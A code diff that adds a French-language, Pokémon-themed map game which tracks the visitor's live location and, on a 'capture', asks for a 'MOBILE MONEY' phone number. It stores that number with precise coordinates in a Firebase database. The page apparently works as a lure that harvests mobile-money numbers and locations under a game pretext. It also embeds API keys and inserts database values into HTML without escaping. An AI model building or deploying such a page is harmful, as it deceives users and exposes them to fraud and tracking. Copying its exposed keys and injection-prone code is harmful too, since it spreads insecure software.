@@ -1,0 +1,409 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Realtime Pokémon Tracking with Popup</title>
+<style>
+  html, body {margin:0; height:100%; font-family:Arial;}
+  #map {height:100vh; width:100%;}
+
+  /* Sidebar */
+  #sidebar {
+    position:absolute; top:10px; left:10px; z-index:5;
+    background:#fff; padding:10px; border-radius:8px;
+    max-height:80vh; overflow-y:auto;
+    box-shadow:0 2px 6px rgba(0,0,0,.3);
+  }
+  .pokemon-item {margin-bottom:6px; font-size:14px; cursor:pointer;}
+  .pokemon-color {
+    display:inline-block; width:12px; height:12px; border-radius:3px; margin-right:6px;
+  }
+
+  /* Intro overlay */
+  #introOverlay {
+    position:fixed; top:0; left:0; width:100%; height:100%;
+    background: linear-gradient(135deg, #ffcb05, #3b4cca);
+    display:flex; align-items:center; justify-content:center;
+    flex-direction:column; color:white; font-size:48px;
+    font-weight:bold; z-index:9999;
+    animation: fadeOut 0.5s ease-out 3s forwards;
+  }
+  #introOverlay img {
+    width:150px; height:150px; margin-bottom:20px;
+    animation: bounce 1s infinite;
+  }
+
+  @keyframes bounce {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-20px); }
+  }
+
+  @keyframes fadeOut {
+    0% {opacity:1;}
+    100% {opacity:0; visibility:hidden;}
+  }
+
+  /* Capture button */
+  #captureBtn {
+    position:fixed; bottom:30px; left:50%; transform:translateX(-50%);
+    background:red; color:white; border:none; padding:15px 25px;
+    font-size:18px; font-weight:bold; border-radius:12px;
+    cursor:pointer; display:none; z-index:999;
+  }
+
+  /* Modal */
+  #captureModal {
+    display:none;
+    position:fixed; top:0; left:0; width:100%; height:100%;
+    background:rgba(0,0,0,0.5); z-index:1000;
+    align-items:center; justify-content:center;
+  }
+  #captureModal .modal-content {
+    background:#fff; padding:20px; border-radius:12px; width:300px; text-align:center;
+  }
+  #captureModal input[type="tel"] {
+    width:80%; padding:8px; margin:10px 0; font-size:16px;
+  }
+  #captureModal button {
+    padding:10px 20px; font-size:16px; border:none; border-radius:8px;
+    background:#3b4cca; color:white; cursor:pointer;
+  }
+</style>
+</head>
+
+<body>
+
+<!-- Intro Animation Overlay -->
+<div id="introOverlay">
+  <img src="https://imgur.com/pJUa9iR.png" alt="Pikachu"/>
+  Allons attraper les Pokémons $$$
+</div>
+
+<div id="map"></div>
+<div id="sidebar"><b>Pokémon:</b><div id="pokemonList"></div></div>
+<button id="captureBtn">Capturer Pokémon!</button>
+
+<!-- Capture Modal -->
+<div id="captureModal">
+  <div class="modal-content">
+    <p>Vous venez de capturer 1 Pokémon! Entre votre numbero "MOBILE MONEY"</p>
+    <input type="tel" id="phoneNumber" placeholder="0812345678" pattern="[0-9]{10}" maxlength="10"/>
+    <br/>
+    <button id="sendBtn">Envoyer</button>
+  </div>
+</div>
+
+<!-- Firebase --><!-- Firebase COMPAT (works with your current code) -->
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
+
+<script>
+// Firebase config
+const firebaseConfig = {
+  apiKey: "AIzaSyAIlkvwyaF6FPPbXBJDqHwuTS5S3QKG3l8",
+  authDomain: "xoxo-store.firebaseapp.com",
+  databaseURL: "https://xoxo-store-default-rtdb.firebaseio.com",
+  projectId: "xoxo-store",
+  storageBucket: "xoxo-store.firebasestorage.app",
+  messagingSenderId: "667290233046",
+  appId: "1:667290233046:web:dbbc9130ff38b0900f8177",
+  measurementId: "G-XMJVCK8KMD"
+};
+
+// 🔥 Initialize Firebase (compat)
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+const auth = firebase.auth();
+
+// 🔥 Auto anonymous login
+auth.onAuthStateChanged(user => {
+  if (!user) {
+    auth.signInAnonymously()
+    .then(() => console.log("Signed in anonymously"))
+    .catch(err => console.error("Anon login error:", err));
+  } else {
+    console.log("User already signed:", user.uid);
+  }
+});
+
+const ROOT_PATH = "/Pokemon";
+
+let map;
+let pokemons = {};
+let directionsService;
+let directionsRenderer;
+let userLocation = null;
+let nearbyPokemon = null;
+let userMarker = null;
+
+function randomColor() {
+  const letters = '456789ABCD';
+  let color = '#';
+  for (let i = 0; i < 6; i++) color += letters[Math.floor(Math.random() * letters.length)];
+  return color;
+}
+
+// Haversine formula
+function getDistance(lat1, lng1, lat2, lng2) {
+  const R = 6371e3;
+  const φ1 = lat1 * Math.PI/180;
+  const φ2 = lat2 * Math.PI/180;
+  const Δφ = (lat2-lat1)*Math.PI/180;
+  const Δλ = (lng2-lng1)*Math.PI/180;
+  const a = Math.sin(Δφ/2)**2 + Math.cos(φ1)*Math.cos(φ2)*Math.sin(Δλ/2)**2;
+  const c = 2*Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+  return R * c;
+}
+
+function initMap() {
+  const defaultCenter = {lat:39.8, lng:-98.5};
+
+  map = new google.maps.Map(document.getElementById("map"), {
+    center: defaultCenter,
+    zoom: 10,
+    gestureHandling: "greedy"
+  });
+
+  directionsService = new google.maps.DirectionsService();
+  directionsRenderer = new google.maps.DirectionsRenderer({
+    map: map,
+    suppressMarkers: true
+  });
+
+  if (navigator.geolocation) {
+    navigator.geolocation.watchPosition(
+      pos => {
+        userLocation = {lat: pos.coords.latitude, lng: pos.coords.longitude};
+        if (!userMarker) {
+          const userIcon = {
+            url: 'data:image/svg+xml;charset=UTF-8,' + encodeURIComponent(`
+              <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40">
+                <circle cx="20" cy="20" r="8" fill="red" fill-opacity="0.6"/>
+                <circle cx="20" cy="20" r="8" fill="none" stroke="red" stroke-width="2">
+                  <animate attributeName="r" values="8;16;8" dur="1.2s" repeatCount="indefinite"/>
+                  <animate attributeName="opacity" values="0.8;0.3;0.8" dur="1.2s" repeatCount="indefinite"/>
+                </circle>
+              </svg>
+            `),
+            scaledSize: new google.maps.Size(40,40),
+            anchor: new google.maps.Point(20,20)
+          };
+          userMarker = new google.maps.Marker({
+            position: userLocation,
+            map,
+            title: "You are here",
+            icon: userIcon
+          });
+        } else {
+          userMarker.setPosition(userLocation);
+        }
+        map.setCenter(userLocation);
+      },
+      err => console.warn("Geolocation failed")
+    );
+
+    setInterval(checkNearbyPokemon, 1000);
+  }
+
+  listenPokemons();
+}
+
+function listenPokemons() {
+  const rootRef = db.ref(ROOT_PATH);
+
+  // Add Pokémon
+  rootRef.on("child_added", snap => {
+    const pokeId = snap.key;
+    setupPokemon(pokeId);
+  });
+
+  // Remove Pokémon
+  rootRef.on("child_removed", snap => {
+    const pokeId = snap.key;
+    if (pokemons[pokeId]) {
+      pokemons[pokeId].marker.setMap(null);
+      const listItem = document.getElementById("poke-" + pokeId);
+      if (listItem) listItem.remove();
+      delete pokemons[pokeId];
+
+      if (nearbyPokemon === pokeId) {
+        nearbyPokemon = null;
+        document.getElementById("captureBtn").style.display = "none";
+      }
+    }
+  });
+
+  // Update Pokémon position/info
+  rootRef.on("child_changed", snap => {
+    const pokeId = snap.key;
+    const v = snap.val();
+    if (!v || !pokemons[pokeId]) return;
+
+    const pos = { lat: Number(v.lat), lng: Number(v.lng) };
+    pokemons[pokeId].lastPoint = pos;
+    pokemons[pokeId].marker.setPosition(pos);
+
+    if (v.markerUrl) {
+      pokemons[pokeId].marker.setIcon({ url: v.markerUrl, scaledSize: new google.maps.Size(72,72), anchor: new google.maps.Point(36,36) });
+    }
+
+    if (v.popupUrl) {
+      pokemons[pokeId].infoWindow.setContent(`<div style="text-align:center;">
+                                               <a href="${v.popupUrl}" target="_blank">
+                                                 <img src="${v.popupUrl}" width="150" height="150"/>
+                                               </a><br>
+                                               <b>${pokeId}</b>
+                                             </div>`);
+    }
+  });
+}
+
+function setupPokemon(pokeId) {
+  const color = randomColor();
+  const pokeRef = db.ref(`${ROOT_PATH}/${pokeId}`);
+
+  const marker = new google.maps.Marker({
+    map,
+    title: pokeId,
+    icon: { url: "", scaledSize: new google.maps.Size(72,72), anchor: new google.maps.Point(36,36) }
+  });
+
+  const infoWindow = new google.maps.InfoWindow({
+    content: `<div style="text-align:center;">
+                <img src="" width="150" height="150"/><br>
+                <b>${pokeId}</b>
+              </div>`
+  });
+
+  marker.addListener('click', () => infoWindow.open(map, marker));
+
+  pokemons[pokeId] = { color, lastPoint: null, marker, infoWindow };
+
+  const div = document.getElementById("pokemonList");
+  const item = document.createElement("div");
+  item.className = "pokemon-item";
+  item.id = "poke-" + pokeId;
+  item.innerHTML = `<span class="pokemon-color" style="background:${color}"></span>${pokeId}`;
+  item.onclick = () => {
+    if (!userLocation || !pokemons[pokeId].lastPoint) return;
+    const pokePos = pokemons[pokeId].lastPoint;
+    directionsService.route({
+      origin: userLocation,
+      destination: pokePos,
+      travelMode: 'DRIVING'
+    }, (result, status) => {
+      if (status === 'OK') directionsRenderer.setDirections(result);
+    });
+    map.panTo(pokePos);
+    map.setZoom(14);
+  };
+  div.appendChild(item);
+
+  pokeRef.on("value", snap => {
+    const v = snap.val();
+    if (!v || typeof v.lat === "undefined" || typeof v.lng === "undefined") return;
+
+    const pos = { lat: Number(v.lat), lng: Number(v.lng) };
+    pokemons[pokeId].lastPoint = pos;
+    marker.setPosition(pos);
+
+    if (v.markerUrl) {
+      marker.setIcon({ url: v.markerUrl, scaledSize: new google.maps.Size(72,72), anchor: new google.maps.Point(36,36) });
+    }
+
+    if (v.popupUrl) {
+      infoWindow.setContent(`<div style="text-align:center;">
+                               <a href="${v.popupUrl}" target="_blank">
+                                 <img src="${v.popupUrl}" width="150" height="150"/>
+                               </a><br>
+                               <b>${pokeId}</b>
+                             </div>`);
+    }
+  });
+}
+
+function checkNearbyPokemon() {
+  if (!userLocation) return;
+  nearbyPokemon = null;
+  for (const pokeId in pokemons) {
+    const poke = pokemons[pokeId];
+    if (!poke.lastPoint) continue;
+    const dist = getDistance(userLocation.lat, userLocation.lng, poke.lastPoint.lat, poke.lastPoint.lng);
+    if (dist <= 9990) {
+      nearbyPokemon = pokeId;
+      break;
+    }
+  }
+  const btn = document.getElementById("captureBtn");
+  btn.style.display = nearbyPokemon ? "block" : "none";
+}
+
+// Show modal on capture
+document.getElementById("captureBtn").onclick = () => {
+  if (nearbyPokemon) {
+    const modal = document.getElementById("captureModal");
+    modal.style.display = "flex";
+    document.getElementById("phoneNumber").value = "";
+  }
+};
+
+document.getElementById("sendBtn").onclick = () => {
+  const phone = document.getElementById("phoneNumber").value.trim();
+  
+  if (!phone.match(/^\d{10}$/)) {
+    alert("SVP! entrer un numero valide de 10-chiffre!");
+    return;
+  }
+
+  if (!nearbyPokemon) {
+    alert("Aucun Pokémon à capturer !");
+    return;
+  }
+
+  // Try to get latest user location
+  if (!userMarker) {
+    alert("Impossible de récupérer votre position. Réessayez.");
+    return;
+  }
+
+  const pos = userMarker.getPosition(); // Google Maps LatLng
+  const captureData = {
+    pokemonId: nearbyPokemon,
+    phoneNumber: phone,
+    timestamp: Date.now(),
+    location: {
+      lat: pos.lat(),
+      lng: pos.lng()
+    }
+  };
+
+  // Push to Firebase
+  db.ref("/Captures").push(captureData)
+    .then(() => {
+      // Remove captured Pokémon
+      db.ref(`${ROOT_PATH}/${nearbyPokemon}`).remove();
+
+      alert(`Félicitations! ${nearbyPokemon} capturé et vos informations ont été sauvegardées.`);
+
+      document.getElementById("captureModal").style.display = "none";
+      document.getElementById("captureBtn").style.display = "none";
+      nearbyPokemon = null;
+    })
+    .catch(err => {
+      console.error("Erreur lors de l'enregistrement : ", err);
+      alert("Impossible de sauvegarder vos informations. Réessayez.");
+    });
+};
+
+
+window.initMap = initMap;
+</script>
+
+<script async defer
+src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDjdnkFWOnh1u2cWf5RFURytU8Zk3fmOhk&callback=initMap">
+</script>
+
+</body>
+</html>
